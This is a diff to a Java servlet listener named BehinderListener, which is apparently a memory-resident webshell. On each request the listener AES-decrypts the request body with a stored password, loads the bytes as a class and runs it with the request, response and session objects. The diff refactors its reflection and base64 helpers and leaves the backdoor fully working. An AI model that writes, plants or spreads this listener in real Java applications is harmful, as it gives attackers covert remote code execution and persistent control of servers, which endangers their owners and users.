@@ -38,13 +38,13 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
                 HttpSession session = ((HttpServletRequest) request).getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-                obj.put("response", unwrapResponse(response));
+                obj.put("response", unwrap(response));
                 obj.put("session", session);
                 session.setAttribute("u", this.pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                 byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
-                Object instance = (new BehinderListener(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
+                Object instance = new BehinderListener(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length).newInstance();
                 instance.equals(obj);
             }
         } catch (Throwable e) {
@@ -57,64 +57,41 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
     }
 
     @SuppressWarnings("all")
+    public Object unwrap(Object obj) {
+        try {
+            return getFieldValue(obj, "response");
+        } catch (Throwable e) {
+            return obj;
+        }
+    }
+
+    @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws Exception {
-        Field field = null;
         Class<?> clazz = obj.getClass();
         while (clazz != Object.class) {
             try {
-                field = clazz.getDeclaredField(name);
-                break;
+                Field field = clazz.getDeclaredField(name);
+                field.setAccessible(true);
+                return field.get(obj);
             } catch (NoSuchFieldException var5) {
                 clazz = clazz.getSuperclass();
             }
         }
-        if (field == null) {
-            throw new NoSuchFieldException(name);
-        } else {
-            field.setAccessible(true);
-            return field.get(obj);
-        }
+        throw new NoSuchFieldException();
     }
 
     @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) throws Exception {
-        byte[] value = null;
-        Class<?> base64;
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            base64 = Class.forName("sun.misc.BASE64Decoder");
-            Object decoder = base64.newInstance();
-            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
-        return value;
-    }
-
-    @SuppressWarnings("deprecation")
-    public Class<?> g(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
     }
 
     @Override
     public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
-    }
-
-    @SuppressWarnings("all")
-    public Object unwrapResponse(Object response) {
-        Object internalResponse = response;
-        while (true) {
-            try {
-                Object r = getFieldValue(response, "response");
-                if (r == internalResponse) {
-                    return r;
-                } else {
-                    internalResponse = r;
-                }
-            } catch (Exception e) {
-                return internalResponse;
-            }
-        }
     }
 }
